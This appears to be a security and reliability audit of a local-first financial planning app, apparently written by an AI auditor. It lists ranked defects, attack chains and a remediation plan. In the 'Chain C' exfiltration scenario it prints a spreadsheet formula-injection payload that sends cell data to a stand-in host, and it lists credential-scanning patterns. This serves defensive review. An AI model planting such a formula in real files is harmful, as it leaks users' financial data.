No `maskAllText`, no `blockAllMedia`, no `maskAllInputs`. Given F-0001 through F-0009 guarantee frequent errors, this records board-pack figures, salaries, and unreleased financials into an external service. `.env.example` documents `SENTRY_REPLAY_MASK_ALL_TEXT=true` — a variable the code never reads. GDPR Art. 5(1)(c) and Art. 32 exposure.

### Negative security findings (verified absent)

| Category | Method | Result | Residual risk |
|---|---|---|---|
| Hardcoded API keys/tokens | regex for `sk-`, `nvapi-`, `ghp_`, `AKIA`, `xox[baprs]-`, PEM blocks across all `.ts/.tsx/.js/.mjs/.json/.rs/.md/.yml/.toml` | **None found** | Low — history squashed, so pre-squash leakage unknowable |
| `@ts-nocheck` | grep across `src server scripts tools` | **0 occurrences** | None |
| Empty catch blocks `catch{}` | PCRE multiline scan | **0** | Low — but 11 catch-and-return-null/empty found (F-0003 class) |
| AG Grid enterprise license misuse | grep `LicenseManager`/`setLicenseKey`/`ag-grid-enterprise` | **None** — community only | None. Compliant |
| `dangerouslySetInnerHTML` / `innerHTML` | grep across `src` | **0 occurrences** | Low |
| Real `eval()` in app code | grep | Only in `PluginSandbox` (`new Function`, F-0018) and in denial comments | Covered by F-0018 |
| CSP | `index.html` + `tauri.conf.json` | Present; no `unsafe-inline` in `script-src`; sha256 for inline theme bootstrap; `object-src 'none'`; `frame-ancestors 'none'` | `style-src 'unsafe-inline'` remains (MEDIUM) |

---

## RELIABILITY AND VIBE-CODE DEBT AUDIT

### F-0023 — CRITICAL — Production bundle throws on every authenticated route
**Risk 10/10 · Confirmed · `src/components/layout/Sidebar.tsx:216` → `dist/assets/index-BkK1SMLd.js`**

```
src/components/layout/Sidebar.tsx(216,12): error TS2304: Cannot find name 'BookOpen'.
src/components/layout/Sidebar.tsx:216:12  error  'BookOpen' is not defined  react/jsx-no-undef
```
`grep -n "BookOpen" src/components/layout/Sidebar.tsx` returns **only line 216** — the usage. There is no import.

**It ships.** From the built asset:
```js
children:[(0,M.jsx)(BookOpen,{className:`w-4 h-4`,"aria-hidden":`true`}),!t&&(0,M.jsx)(`span`,{children:`API Reference`})]
```
`grep -c "BookOpen" dist/assets/index-BkK1SMLd.js` → `1`. No `var`/`const`/`let`/`function`/`import` binding exists.

**Executed PoC:** `RUNTIME RESULT: ReferenceError: BookOpen is not defined`

**Test corroboration:** `Sidebar.test.tsx` **20/20 failed**. `AppLayout.test.tsx` **13/13 failed**. `CommandPalette.test.tsx` **6/6 failed**. `AppLayout` mounts `Sidebar` on every authenticated route.

Vite/esbuild strips types without checking them, so `npm run build` exits 0 while emitting a guaranteed crash. This single defect makes the product unusable and simultaneously falsifies "Production-Ready," the `[x]` on COMPLETION_TASKLIST 0.2, and any claim that gates were enforced.

**Required fix:** add `BookOpen` to the `lucide-react` import. Then make `tsc --noEmit` a **blocking** prerequisite of `build` in `package.json`, not merely a separate CI job.

### F-0024 — CRITICAL — All local quality gates are structurally inert
**Risk 8/10 · Confirmed**

```
-rw-r--r-- 1 user user  5536 .husky/pre-commit     ← NOT executable
-rw-r--r-- 1 user user 11974 .husky/pre-push       ← NOT executable
ls .husky/_/  → No such file or directory          ← husky.sh missing; both hooks `. "$(dirname -- "$0")/_/husky.sh"`
git config core.hooksPath → (unset)
.git/hooks/ → commit-msg only
.npmrc → ignore-scripts=true                       ← blocks the `prepare: husky` script
```
Four independent reasons the hooks cannot execute. The pre-push file elaborates 8 gates across 12 KB of commentary (Gates 1,2,3,4,5,5b,10,15,17,18) referencing "NEVER-AGAIN RULE #55/#68/#78/#118," "CASCADE-TRAP class V," and a "PERSONA-CROSS-COVERAGE" gate that counts how many times the words CFO/Controller/Auditor appear in a markdown file. None of it runs. This is the defining artifact of the codebase: elaborate governance ceremony with zero enforcement.

Note also that pre-push Gate 3 deliberately runs a **6-path subset** of tests, justified by the comment that the full suite is CI-gated — while CI's `test` job is **not** a dependency of the `build` job (`needs: [typecheck, lint]`), so a red test suite does not block the build artifact.

### F-0025 — HIGH — Full test suite cannot complete
**Risk 8/10 · Confirmed**

`vitest run` produced no summary after 2,700 s and had to be killed. Root causes isolated by sharding:
- `src/services/SecretsVault.test.ts` — **560,940 ms**, 41 of 79 tests failing
- `src/store/migration/cubeMigration.test.ts` — **180,123 ms**, 12 failing (all timeouts)
- `src/pages` shard — killed at 1,400 s having completed only 77 of 188 files

COMPLETION_TASKLIST 0.4 already concedes this: *"full run timed out; hang isolation open."* Yet 0.2/0.3/0.5 are marked `[x]` and the README says Production-Ready. A suite that cannot terminate cannot gate anything, and coverage can never be measured.

### F-0026 — CRITICAL — Store layer is 35% red because RBAC was bolted on without updating tests
**Risk 8/10 · Confirmed · `src/store` shard: 27/40 files failed, 219/627 tests failed**

```
FAIL  src/store/analyticsStore.test.ts > analyticsStore > should add a chart
PermissionError: [RBAC] Permission denied: 'dashboard:create' required for action 'addChart' (no user)
  ❯ Object.addChart src/utils/rbacEnforcer.ts:154:15
```
Worst files: `glStore.cube` 16/18, `glTrialBalanceStore` 14/16, `budgetStore` 14/27, `glUploadStore` 11/12, `entityStore` 12/25, `capexStore` 12/16, `forecastStore` 9/10, `scenarioStore` 7/8, `reportStore` 7/8, `varianceStore` 7/10.

The GL, budget, trial-balance, forecast, scenario, and reporting stores — the entire FP&A core — are red. A feature was shipped that broke a third of the state layer's tests and the result was accepted.

### F-0027 — HIGH — Tests that certify defects, and 48 tautological assertions
**Risk 6/10 · Confirmed**

`expect(true).toBe(true)` appears **48 times**. The pattern is systematic:
```ts
if (typeof parser.validate === 'function') { expect(parser.validate('1+2*3')).toBe(true); }
else { expect(true).toBe(true); }                    // passes when the feature is absent
```
```ts
expect(true).toBe(true); // throw is acceptable
expect(true).toBe(true); // parser may not support booleans
```
These convert missing functionality into green checkmarks. Combined with F-0002 (FX tests asserting the wrong rate), the suite's 96.2% pass rate cannot be read as evidence of correctness.

Three benchmark files contain `it()` blocks with **zero** `expect()` calls.

### F-0028 — HIGH — 105 of 181 engines (58%) are unreferenced dead code
**Risk 6/10 · Confirmed**

Engines with zero references from `src/pages`, `src/components`, `src/store`, `src/services`, or `src/hooks` include: `CapExEngine`, `DepreciationEngine`, `DebtScheduleEngine`, `CashFlowWaterfallEngine`, `CashEngine`, `ComplianceEngine`, `ConsolidationAdjustmentsEngine`, `CascadeCalculationEngine`, `AuditEngine`, `DataLineageEngine`, `DataQualityEngine`, `CrashRecoveryEngine`, `CellProtectionEngine`, `CellValidationEngine`, `ETLPipelineEngine`, `DimensionalModelingEngine`, `AdvancedOLAPEngine`, `AdvancedExcelEngine`, `ArrayFormulaEngine`, and 86 more.

The README markets "202+ financial engines" as the product's depth. The majority are barrel-exported, unit-tested, and reachable from no user interface. Test count is inflated by code that ships to no one. `PeriodCloseEngine` is the most damaging instance (F-0013).

### F-0029 — MEDIUM — 559 eslint-disable directives; `any` disabled in financial UI
**Risk 4/10 · Confirmed**

559 `eslint-disable` lines across `src`. File-level `@typescript-eslint/no-explicit-any` disables sit on `src/App.tsx`, `src/components/budgets/BudgetGrid.tsx` (the budget editing grid), and `src/utils/masterStorage.ts` (the persistence layer). `jsx-a11y/label-has-associated-control` is disabled file-wide in `ICReconciliation.tsx` and `CurrencyTranslation.tsx` while the README claims WCAG 2.2 AA.

### F-0030 — MEDIUM — Documentation-to-code ratio and orphan process artifacts
**Risk 3/10 · Confirmed**

407 markdown files against 1,020 non-test source files. `_bmad/`, `.claude/`, `.codex/`, `.agents/`, `skills/`, `prompt/`, `plan/`, `plan and advice/` are agent-process directories with no product value. `.gitignore` lists `.claude/` and `.agents/` as ignored, yet both are committed. `docs/drafts/` is gitignored while `.github/workflows/*.yml` headers cite `docs/drafts/atlas/CI_MATRIX.md` as their specification — the workflows reference documentation that cannot exist in a clean clone.

---

## TESTING AND CI AUDIT

| Gate | Configured | Actually enforced | Status at HEAD |
|---|---|---|---|
| `tsc --noEmit` | `ci.yml`, `tsc.yml` | Yes in CI | **FAILING** |
| `eslint src` | `ci.yml` (no `--max-warnings`) | Yes | **FAILING** (1 error) |
| `eslint src --max-warnings 0` | `lint.yml`, pre-push Gate 2 | pre-push inert | **FAILING** (13) |
| Unit tests | `ci.yml`, `test-unit.yml` (15-min timeout) | Yes — but `build` does **not** depend on `test` | **CANNOT COMPLETE** |
| Coverage | `--coverage`, thresholds 50% | Yes | **UNOBTAINABLE** |
| Build + bundle | `ci.yml`, `build.yml` | Yes | **PASS** |
| E2E Playwright | `ci.yml` | `needs: [build]` | Not run here (sandbox); 57 specs exist |
| A11Y | `ci.yml` | **`continue-on-error: true`** + auto-skips when `test:a11y` undefined — **it is undefined** | **NO ENFORCEMENT** |
| Husky pre-commit/pre-push | `.husky/*` | **Inert** (F-0024) | **NO ENFORCEMENT** |
| Cascade-hold ledger | `cascade-hold-check.yml` | Yes | Validates markdown, not product |

`test-unit.yml` allocates `--max-old-space-size=81920` (80 GiB) with a 15-minute job timeout. Given the measured suite cannot finish in 45 minutes locally, this job must be failing or timing out on every run. The 80 GiB heap is itself a red flag: it masks a memory-leak or teardown defect rather than fixing it.

`.github/repo-settings.json` exists but I found no evidence of enforced branch protection; with one squashed commit and zero human review, no review gate is demonstrable.

---

## PERFORMANCE AND SCALE AUDIT

| Target (README) | Measured | Verdict |
|---|---|---|
| Main chunk ≤150 KB gzip | 113.04 KB | **PASS** |
| Total JS ≤2 MB gzip | 1,959.86 KB (95.7% of budget) | **PASS — but 40 KB of headroom** |
| Consolidation 1,000 entities <500 ms | Not measured | Unverified |
| Monte Carlo 10,000 iters <2 s | Not measured | Unverified |
| 100,000-row grid ≥30 fps | Not measured | Unverified |

Largest chunks: `DataGrid` 302.19 KB gz, `excel-core-vendor` 237.57 KB gz, `pdf-vendor` 179.22 KB gz, `ai-vendor` 152.44 KB gz. The `@huggingface/transformers` dependency pulls a 540 KB chunk plus (per the vite.config comment) 23.5 MB of WASM for in-browser AI. Total budget headroom is 4.3%; one more vendor addition breaches it.

Worker inventory is 4, not 7 or 14. `worker-pool.ts` exists. Monte Carlo uses a seeded xoshiro128** PRNG — genuinely reproducible, which is correct and worth noting.

---

## DESKTOP/TAURI AND OFFLINE AUDIT

- `shell:allow-execute` + unscoped `fs` + `sql:allow-execute` (F-0019, HIGH).
- Updater active against non-resolving domain (F-0020, HIGH).
- Version skew: `lib.rs` `0.1.0` vs `Cargo.toml`/`package.json` `1.0.0`.
- Only one `#[tauri::command]` in `lib.rs` (`get_app_info`). The README's `calculate_consolidation` Rust IPC example is fictional.
- SQLite schema: `001_initial_schema.sql` 502 lines / 29 tables; `002_cube_schema.sql` 87 lines / 6 tables. Real.
- IndexedDB→SQLite migration: `migrateFromIndexedDB()` is a lazy dynamic import invoked from onboarding/settings; no rollback path, no integrity verification, and its backup tests all time out (F-0010).
- `npm run tauri:build` not executed (no Rust toolchain) — **coverage gap**.
- PWA `registerType: 'autoUpdate'` with `skipWaiting: true` and `clientsClaim: true`, and a `StaleWhileRevalidate` handler for all `.js`/`.css`. A user can be served stale application code mid-session while viewing live financial data — MEDIUM risk of version/data skew.

---

## PLUGIN AND EXTENSIBILITY AUDIT

Real acorn AST validation, a 100 KB size cap, blocked-global shadowing, and `sourceType: 'script'` to forbid ESM — this is competent work. It is undermined by:
- Main-thread execution with a post-hoc timeout (F-0018, HIGH).
- Comment concedes *"a bare `eval` (which the AST currently does NOT reject)"* — mitigated only by proxy shadowing.
- No signing, no provenance, no permission prompts, no network-egress policy.
- Marketplace has no backend; `PLUGIN_MARKETPLACE_URL` is commented out.
- Combined with F-0019, a malicious plugin that escapes reaches `shell:allow-execute`.

---

## CONNECTOR AND INTEGRATION AUDIT

Present: NetSuite (OAuth1.0a TBA, HMAC-SHA256 — correctly identified as OAuth1 not OAuth2), QuickBooks, Xero, Sage, Dynamics, Salesforce, plus `BaseConnector` and `ConnectorRegistry`. The NetSuite implementation shows genuine domain knowledge.

Absent from the required list: SAP, Oracle, Stripe, PayPal, Brex, Ramp, Bill.com, ADP, Gusto, Rippling, HubSpot, Snowflake, BigQuery, Postgres, MySQL, generic REST, SFTP, Google Sheets. **18 of 24 target integrations missing.**

No connector is proven against a live or recorded API. No SSRF guard, no redirect validation, no token-refresh proof, no idempotency or duplicate-detection on re-sync. `ConnectorEngine.ts` carries `@clock-injection TODO` in its header.

---

## AI FEATURE SAFETY AUDIT

`@huggingface/transformers` runs models client-side; no external key is embedded (the `.env.example` NIM removal is real and correct). But: no prompt-injection defense against adversarial content in imported GL descriptions; no output validation before financial figures are rendered; no eval harness; no human-approval gate; no provenance labelling on AI-generated commentary. `AutoCommentaryEngine` and `AnomalyExplainer` can emit confident narrative text into board packs with no correctness guarantee. `AnomalyDetectionEngine.ts:198` carries `FIXME (data-integrity, deferred): percentile() uses linear interpolation`.

---

## ACCESSIBILITY AND I18N AUDIT

- WCAG 2.2 AA claimed; **zero enforcement** — `test:a11y` is undefined and the CI job is `continue-on-error: true` (F-0014/C-0014).
- `jsx-a11y/label-has-associated-control` disabled file-wide in financial forms.
- `jest-axe`/`vitest-axe` installed and used in places; pre-push explicitly excludes the `wcag-aa` suite, acknowledging *"real a11y violations tracked separately in P1."*
- i18n: `i18next` wired; 6 languages claimed. `OnboardingWizard.i18n.test.tsx` has a failing test.
- `window.matchMedia is not a function` crashes `prefersReducedMotion` in tests (`src/utils/animations.ts:129`) — reduced-motion support is unverified.

---

## COMPETITIVE GAP MATRIX

Status against the founder's "replace all of these combined" target. P0 = blocks all-in-one use.

| Capability | Reference tools | Status | Evidence | Priority |
|---|---|---|---|---|
| Application loads without crashing | All | **MISSING** | F-0023 `ReferenceError` in shipped bundle | **P0** |
| Correct FX translation | Anaplan, OneStream, Oracle EPM | **MISSING** | F-0001, F-0002 | **P0** |
| Decimal-safe money arithmetic | Excel, all EPM | **MISSING** | F-0006 — 1 file uses decimal.js | **P0** |
| Double-entry validation | Every ERP/GL | **MISSING** | F-0004 | **P0** |
| Period close / lock | Planful, Vena, Prophix, Oracle EPM | **MISSING** | F-0013 — engine orphaned | **P0** |
| Backup / restore proof | All enterprise | **MISSING** | F-0010 — all tests time out | **P0** |
| Tamper-evident audit trail | Vena, Planful (SOX) | **MISSING** | F-0015 | **P0** |
| Server-side authorization | All enterprise | **MISSING** | F-0016 — client-only | **P0** |
| Encryption at rest | All enterprise | **MISSING** | F-0014 — hardcoded shipped key | **P0** |
| CSV injection defense | All mature exporters | **MISSING** | F-0017 | **P0** |
| Consolidation + eliminations + NCI | Anaplan, OneStream | **PARTIAL** | Engine is substantial; silently fails (F-0003) | **P0** |
| GL ingestion / trial balance / CoA | Datarails, Cube | **PARTIAL** | Implemented; store tests 14/16, 16/18 red | P0 |
| Budgeting + approval workflow | Adaptive, Planful | **PARTIAL** | `budgetStore` 14/27 tests red; Tasklist 2.1.x all `[ ]` | P0 |
| Forecasting / rolling / driver-based | Anaplan, Pigment | **PARTIAL** | `forecastStore` 9/10 red; Tasklist 2.2.x `[ ]` | P0 |
| Scenario + Monte Carlo + goal seek | Pigment, Runway | **PARTIAL** | Seeded PRNG is real; `scenarioStore` 7/8 red | P1 |
| P&L / BS / CF + articulation | Excel, all | **PARTIAL** | Engines exist; articulation unproven; Tasklist 2.3.x `[ ]` | P0 |
| Variance analysis | All | **PARTIAL** | `varianceStore` 7/10 red | P1 |
| Board pack generation | Fathom, Spotlight | **PARTIAL** | jsPDF present; Tasklist 2.3.4 `[ ]` | P1 |
| Excel formula parity / formula bar | Excel, Vena, Datarails | **PARTIAL** | `SafeMathParser` real but 4 tests failing | P0 |
| Copy/paste from Excel, keyboard grid | Excel, Vena | **UNKNOWN** | AG Grid present; unverified; Tasklist 2.1.3 `[ ]` | P0 |
| Multi-entity consolidation UI | Anaplan, OneStream | **PARTIAL** | Components exist; Tasklist 2.4.x `[ ]` | P0 |
| SaaS metrics (MRR/ARR/NRR/LTV) | Mosaic, Runway | **PARTIAL** | Engines exist; sector wiring unproven | P1 |
| Sector templates (40+) | Jirav, Fathom | **PARTIAL** | 48 dirs; smoke tests only; Tasklist Phase 3 all `[ ]` | P1 |
| Connectors (24 targeted) | Cube, Datarails | **PARTIAL** | 6 of 24; none proven live | P0 |
| SSO / SCIM / MFA | All enterprise | **MISSING** | No implementation | P0 |
| Public API / webhooks / SDK | Anaplan, Pigment | **MISSING** | `src/sdk/` exists; no public API surface | P1 |
| Real-time collaboration | Pigment, Runway | **MISSING** | F-C-0011/0012 | P1 |
| Scheduled report distribution | Planful, Prophix | **UNKNOWN** | `ReportDistributionEngine` has 3 tests, unreferenced | P1 |
| SOC 2 / SOX readiness | All enterprise | **MISSING** | No audit trail integrity, no period lock, no server authz | P0 |
| Disaster recovery / RTO/RPO | All enterprise | **MISSING** | No restore proof | P0 |
| Offline desktop persistence | Excel, Datarails | **PARTIAL** | SQLite wired; migration unverified; Tasklist 9.x all `[ ]` | P0 |

**P0 blockers: 24. Superior-to-competition capabilities: 0.**

---

## ALL-IN-ONE REPLACEMENT ANALYSIS

**Can it replace Excel?** No. It crashes on load (F-0023). Even fixed, `toFixed(2)` rounding and float accumulation mean exported figures will not tie to a spreadsheet, and there is no proven copy/paste or formula-bar parity.

**Can it replace Anaplan / Adaptive / Planful / Pigment / Oracle EPM?** No. No SSO, no SCIM, no MFA, no server-side authorization, no tamper-evident audit trail, no period lock, no restore proof. It would fail the first security questionnaire.

**Can it replace BI dashboards?** No. Dashboards render, but the engines feeding sector KPIs are 58% unreferenced and the store layer is 35% red.

**Can it replace manual spreadsheet consolidation?** No — and this is the sharpest verdict. A missing FX rate silently returns $0 (F-0001), the dated lookup returns the wrong rate (F-0002), and any internal error is reported as a balanced zero consolidation (F-0003). Manual spreadsheet consolidation, for all its faults, does not silently delete a subsidiary. **This product is currently more dangerous than the process it replaces.**

**Would a CFO sign financials produced by this tool?** No. And an auditor who discovered F-0003 or F-0015 would reject the control environment outright.

---

## RANKED FINDINGS

| ID | Sev | Risk | Title | Location | Conf |
|---|---|---|---|---|---|
| F-0023 | CRITICAL | 10 | Production bundle throws `ReferenceError: BookOpen` on every authenticated route | `Sidebar.tsx:216` → `dist/assets/index-BkK1SMLd.js` | Confirmed |
| F-0001 | CRITICAL | 10 | Missing FX rate silently zeroes foreign subsidiary balances | `FXEngine.ts:33-49` | Confirmed |
| F-0002 | CRITICAL | 10 | Dated FX lookup returns oldest rate; test asserts the defect | `FXEngine.ts:38`, `FXEngine.test.ts:27` | Confirmed |
| F-0003 | CRITICAL | 10 | Consolidation swallows all errors, reports `isBalanced: true` with zeros | `ConsolidationEngine.ts:365,868-902` | Confirmed |
| F-0014 | CRITICAL | 10 | AES key is a hardcoded literal shipped in the JS bundle | `masterStorage.ts:21-25` → `dist/assets/masterStorage-oF2BpH5d.js` | Confirmed |
| F-0004 | CRITICAL | 9 | GL validator omits debits = credits invariant | `glStore.ts:472-503` | Confirmed |
| F-0006 | CRITICAL | 9 | "100% decimal.js" false; all money math is IEEE-754 float | repo-wide; 1 importer | Confirmed |
| F-0010 | CRITICAL | 9 | Backup/restore unproven — all 5 backup tests time out | `cubeMigration.test.ts:183-224` | Confirmed |
| F-0011 | CRITICAL | 9 | Storage writes unguarded — silent data loss on quota failure | `masterStorage.ts:127-136` | Confirmed |
| F-0015 | CRITICAL | 9 | Audit hash unverifiable by construction; 32-bit non-crypto; no chain | `auditTrailStore.ts:144-186` | Confirmed |
| F-0016 | CRITICAL | 8 | Client-only RBAC on local-first data; two bypass paths | `rbacEnforcer.ts:126-166` | Confirmed |
| F-0017 | CRITICAL | 8 | No CSV/Excel formula-injection defense | `utils/csv.ts` | Confirmed |
| F-0024 | CRITICAL | 8 | All Husky gates structurally inert (4 independent causes) | `.husky/*`, `.npmrc` | Confirmed |
| F-0026 | CRITICAL | 8 | Store layer 35% red — RBAC shipped without updating tests | `src/store` shard | Confirmed |
| F-0013 | HIGH | 8 | No period close / period lock anywhere; engine orphaned | repo-wide | Confirmed |
| F-0019 | HIGH | 8 | Tauri grants `shell:allow-execute` + unscoped fs + arbitrary SQL | `capabilities/default.json` | Confirmed |
| F-0025 | HIGH | 8 | Full test suite cannot complete; coverage unobtainable | `SecretsVault` 560s, `cubeMigration` 180s | Confirmed |
| F-0007 | HIGH | 7 | CTA applied to income/expense; invalid inputs return 0 | `FXEngine.ts:207-262` | Confirmed |
| F-0012 | HIGH | 7 | Decryption failure returns ciphertext as plaintext | `masterStorage.ts:118-125` | Confirmed |
| F-0018 | HIGH | 7 | Plugin sandbox timeout unenforceable; main-thread freeze | `PluginSandbox.ts:332-352` | Confirmed |
| F-0020 | HIGH | 7 | Updater active against non-resolving domain; version skew | `tauri.conf.json` | Confirmed |
| F-0021 | HIGH | 7 | 14 HIGH vulns in production deps on the xlsx import path | `npm audit --omit=dev` | Confirmed |
| F-0008 | HIGH | 6 | Formula engine accepts empty/whitespace input | `SafeMathParser.test.ts:1573` | Confirmed |
| F-0005 | HIGH | 6 | `validCount` subtracts error count from row count | `glStore.ts:500` | Confirmed |
| F-0009 | HIGH | 6 | Hardcoded absolute $0.01 balance tolerance | `ConsolidationEngine.ts:324` | Confirmed |
| F-0027 | HIGH | 6 | 48 tautological assertions; tests certify absent features | repo-wide | Confirmed |
| F-0028 | HIGH | 6 | 105 of 181 engines (58%) unreferenced by any UI/state code | repo-wide | Confirmed |
| F-0022 | MEDIUM | 5 | Sentry replays 100% of error sessions unmasked | `main.tsx:19-27` | Confirmed |
| F-0029 | MEDIUM | 4 | 559 eslint-disables; `any` disabled in BudgetGrid + masterStorage | repo-wide | Confirmed |
| F-0030 | MEDIUM | 3 | 407 docs vs 1,020 source files; committed agent dirs; broken doc refs | repo-wide | Confirmed |
| F-0031 | MEDIUM | 4 | PWA `skipWaiting`+`StaleWhileRevalidate` can serve stale code with live data | `vite.config.ts` | Likely |
| F-0032 | MEDIUM | 3 | `style-src 'unsafe-inline'` in both CSPs | `index.html`, `tauri.conf.json` | Confirmed |
| F-0033 | LOW | 2 | Version skew `0.1.0` vs `1.0.0` | `lib.rs` vs `Cargo.toml` | Confirmed |
| F-0034 | LOW | 2 | README badges wrong (Vite 7.3 vs 8, Tailwind 4.1 vs 4.3, Coverage 100%) | README | Confirmed |
| F-0035 | LOW | 2 | 3 benchmark files contain `it()` blocks with zero assertions | `*.benchmark.test.ts` | Confirmed |

**35 findings: 14 CRITICAL, 13 HIGH, 5 MEDIUM, 3 LOW.**

---

## COMPOSITE ATTACK AND FAILURE CHAINS

**Chain A — Silent material misstatement (no attacker required).**
Controller closes March. The March EUR/USD rate was never loaded → F-0001 returns `0` → `convert()` yields `0` → the EUR subsidiary contributes nothing. Simultaneously F-0002 applies January's rate to every other subsidiary. F-0003 ensures any exception surfaces as a balanced zero. F-0004 permits unbalanced journals to have entered. F-0006 has already drifted the pennies. Board pack exports clean and green. **Probability under normal operation: certain. Detection: none.**

**Chain B — Local privilege escalation to host compromise.**
Analyst installs a marketplace plugin. F-0018: sandbox timeout is post-hoc; a long synchronous loop or an AST-evading construct executes. F-0016: RBAC is client-side, so the plugin flips its own role. F-0014: it decrypts all persisted financial state using the key it reads from its own bundle. F-0019: on desktop, `shell:allow-execute` plus unscoped `fs` converts this into arbitrary code execution and full disk read/write. F-0015: the audit trail cannot evidence any of it.

**Chain C — Exfiltration via the export path.**
Attacker plants `=HYPERLINK("http://x/?d="&A1,"Refresh")` in an ERP memo field. It imports (F-0017, no sanitization on read), persists, and re-exports to CSV (F-0017, no sanitization on write). The controller opens it in Excel; the formula fires and exfiltrates adjacent cells. F-0021's `adm-zip`/`brace-expansion` DoS vectors sit on the same `.xlsx` path.

**Chain D — Data loss after desktop update.**
User works offline; storage hits quota. F-0011: `setItem` rejects with no handler; the user sees no error. F-0012: a partially written blob later fails to decrypt and is returned as ciphertext to `JSON.parse`. F-0010: no working backup exists to restore from. F-0031: the PWA serves stale JS against fresh data. **Recovery: none.**

---

## NEGATIVE FINDINGS AND EVIDENCE

| Category | Scope inspected | Method | Evidence of absence | Residual risk | Conf |
|---|---|---|---|---|---|
| Hardcoded secrets | All `.ts/.tsx/.js/.mjs/.json/.rs/.md/.yml/.toml` outside node_modules | Targeted regex for 8 credential formats + PEM | Zero matches | History squashed — pre-squash state unknowable | Likely |
| `@ts-nocheck` | `src server scripts tools` | grep | 0 | None | Confirmed |
| Empty `catch {}` | `src` | PCRE multiline | 0 | 11 catch-and-return-null remain (F-0003 class) | Confirmed |
| AG Grid licensing | `src` | grep for enterprise API | Community-only usage | None — compliant | Confirmed |
| XSS via innerHTML | `src` | grep `dangerouslySetInnerHTML`/`innerHTML` | 0 | AI-rendered markdown path unreviewed | Likely |
| `eval()` in app code | `src` | grep | Only `PluginSandbox` `new Function` | Covered by F-0018 | Confirmed |
| Bundle budget | `dist/assets` | `bundle-check.js` | 113/1959 KB — genuine pass | 4.3% headroom | Confirmed |
| Monte Carlo determinism | `monte-carlo.worker.ts` | Code read | Seeded xoshiro128**, reproducible | Statistical validity untested | Confirmed |
| MIT license | `LICENSE`, `package.json` | Read | Present, consistent | None | Confirmed |

---

## TEST AND VERIFICATION PLAN

**Financial known-answer vectors (all currently missing):**
1. FX: rates at 2026-01-31=1.05, 02-28=1.07, 03-31=1.09 → `getRate('EUR','USD','2026-03-31')` **must** equal 1.09.
2. FX: no rate loaded → `convert()` **must throw** `MissingFXRateError`, never return 0.
3. GL: journal with debits 1,000.00 / credits 999.99 → **must reject** with exact imbalance reported.
4. GL: 5 rows, 1 invalid producing 3 errors → `validCount` **must** equal 4.
5. Consolidation: inject a throwing entity → **must** propagate, never return `isBalanced: true`.
6. Consolidation: 3-level chain A→B 80%, B→C 50% → effective A→C = 40%; NCI attribution must tie.
7. Rounding: allocate 100.00 across 3 cost centres → parts sum exactly to 100.00; residual assigned deterministically.
8. Rounding: assert `round(1.005,2)===1.01` and `round(2.675,2)===2.68` under the declared mode.
9. Articulation: net income → retained earnings; cash-flow close → balance-sheet cash, to the cent.
10. Property test: for any random balanced GL, `Σassets + Σliabilities + Σequity === 0` within relative tolerance.

**Regression tests required:**
- Render `<Sidebar/>` and `<AppLayout/>` and assert no `ReferenceError` — must fail before the F-0023 fix.
- Grep-gate in CI: fail if any `.ts/.tsx` references an undefined JSX identifier (enforced by making `tsc` block `build`).
- CSV corpus: `=`, `+`, `-`, `@`, `\t`, `\r` leading cells must be neutralized on both import and export.
- `masterStorage.setItem` under simulated `QuotaExceededError` must surface a user-visible error.
- Backup → wipe → restore → deep-equal all 40 stores. Must run under 15 s or be redesigned.
- Audit chain: mutate entry N, run verifier, assert detection.
- Plugin `while(true){}` must be terminated by the harness within the declared timeout.

---

## REMEDIATION PLAN

### IMMEDIATE P0 (before any further feature work)
1. **F-0023** — import `BookOpen` in `Sidebar.tsx`. Then make `build` depend on `tsc --noEmit` in `package.json` so this class of defect can never ship again.
2. **F-0001/F-0002** — throw on missing rates; fix dated lookup to latest-on-or-before; **rewrite the tests that assert the defects**.
3. **F-0003** — remove the blanket catch; propagate `ConsolidationFailedError`; `emptyResult()` must never claim `isBalanced: true`.
4. **F-0004/F-0005** — enforce debits = credits per journal; fix `validCount` with a row-index set.
5. **F-0014** — remove the hardcoded key; OS keychain or user passphrase; strike the encryption claims until true.
6. **F-0017** — CSV/Excel formula-injection neutralization on read and write.
7. **F-0024** — `chmod +x .husky/*`, run `husky install`, remove `ignore-scripts=true` or add an explicit install step, set `core.hooksPath`.
8. **F-0026** — repair the 219 failing store tests; do not suppress them with permission stubs that hide real authorization gaps.
9. **F-0010/F-0025** — fix or quarantine `SecretsVault` (560 s) and `cubeMigration` (180 s) so the suite terminates; then produce a real backup→restore proof.
10. **F-0019** — delete `shell:allow-execute`; scope `fs`; replace `sql:allow-execute` with named commands.
11. **Correct the README.** Delete "Production-Ready," "100% decimal.js," "End-to-end encryption," "WCAG 2.2 AA," "Coverage 100%," and the 5 non-existent workers.

### 30 DAYS
F-0006 decimal migration across monetary paths with a declared rounding mode · F-0015 SHA-256 hash-chained audit trail with verifier · F-0011/F-0012 storage error handling and fail-closed decryption · F-0013 period close and lock enforced at every mutation · F-0021 dependency remediation · F-0008/F-0009 formula and tolerance fixes · restore `tsc`+`lint`+`test` as blocking CI with `build` depending on `test`.

### 60 DAYS
F-0016 server-side authorization with the Express layer actually installed, tested, and in CI · F-0018 plugin execution moved to a terminable Worker · F-0028 delete or wire the 105 orphan engines — every retained engine must have a UI consumer · F-0007 ASC 830 correction · F-0022 Sentry masking · E2E green for import-GL → budget → forecast → report → export → persist → restore.

### 90 DAYS
SSO/SCIM/MFA · SOC 2 control mapping with evidence · connector expansion beyond 6 with recorded-fixture tests · WCAG 2.2 AA with enforcing CI (`continue-on-error: false`) · performance benchmarks against the README's stated targets · documented DR with RTO/RPO.

---

## OPERATIONAL HARDENING

Structured logging with redaction on every financial mutation. Alerts on: missing FX rate encountered, consolidation imbalance, storage write failure, audit-chain verification failure, plugin timeout. Metrics: import success rate, consolidation duration, storage quota headroom, restore drill results. A monthly restore drill is mandatory — an untested backup is not a backup. Externalize the audit sink to append-only storage the client cannot rewrite.

---

## ENTERPRISE READINESS PLAN

Current SOC 2 / SOX posture: **not startable**. Blockers: no tamper-evident audit trail (CC7.2), no server-side authorization (CC6.1), no period lock / change control (SOX 404), no restore proof (A1.2), no access reviews, no encryption key management (CC6.7), no incident response evidence, no data-residency story. Each maps directly to a P0 above; none can be documented away.

---

## SELF-AUDIT RESULT

I challenged every finding for false positives and corrected the record where the evidence did not support the accusation:

- **Corrected mid-audit:** I initially concluded from `grep hasPermission src/store` that only `authStore` enforced RBAC. That was wrong. 27 of 40 stores enforce via `src/utils/rbacEnforcer.ts`. F-0016 was rewritten from "RBAC absent" to the accurate and still-critical "RBAC is client-side and bypassable." Reporting the stronger false claim would have been the easier finding; it would also have been wrong.
